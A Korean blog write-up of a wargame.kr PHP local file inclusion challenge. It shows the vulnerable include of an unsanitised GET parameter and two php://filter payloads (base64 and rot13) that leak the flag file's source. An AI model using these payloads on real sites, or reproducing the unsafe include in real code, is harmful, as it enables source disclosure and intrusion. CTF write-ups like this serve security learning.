---
title: "[wargame.kr] PHP LFI 문제"
excerpt: "PHP LFI 문제 풀이"
categories:
    - dreamhack
tags:
    - wargame
    - php
    - include
    - wrapper
last_modified_at: 2023-08-29T09:13:00-05:00
---
## LFI + PHP Wrapper
- include 취약점과 wrapper 취약점을 이용하여 문제를 해결해 주어야 한다.


### 코드 분석
- include 부분에 취약점이 존재한다.
- 요청 파라미터로 아무것도 받지 못하면 디펄트로 설정된 main.php 파일을 include 한다.
- get 요청 파라미터로 확장자를 뺀 이름을 넣어주면 `include 파일이름.php` 가 include 되는 것을 확인할 수 있다.

```php
<?php
  include $_GET['page']?$_GET['page'].'.php':'main.php';
?>
```

### php 프로토콜의 filter 기능을 이용한 공격 Payload
- filter 기능을 이용하면 파일 내용을 먼저 필터링 처리한 다음 php 파일로서 실행이 된다.

- 방법 1.  `convert.base64-encode` 이용하기
- 이렇게 하면 flag.php 파일 내용이 먼저 base64 로 인코딩을 한 다음 php 파일로서 실행이 된다.

```
/?page=php://filter/read=convert.base64-encode/resource=/var/www/uploads/flag
```

- 방법 2. `string.rot13` 
- 이렇게 하면 flag.php 파일 내용이 먼저 rot13 로 인코딩을 한 다음 php 파일로서 실행이 된다.

```
/?page=php://filter/read=string.rot13/resource=/var/www/uploads/flag
```

- 인코딩된 데이터를 사용자는 받을 수 있기 때문에 파일 내용을 확인하기 위해서는 디코딩 작업을 해주면 된다.


## 참고 사이트
- [php 프로토콜](https://www.php.net/manual/en/wrappers.php)
- [php 에서 지원하는 필터](https://www.php.net/manual/en/filters.php)
- [rot13 디코더](https://rot13.com/)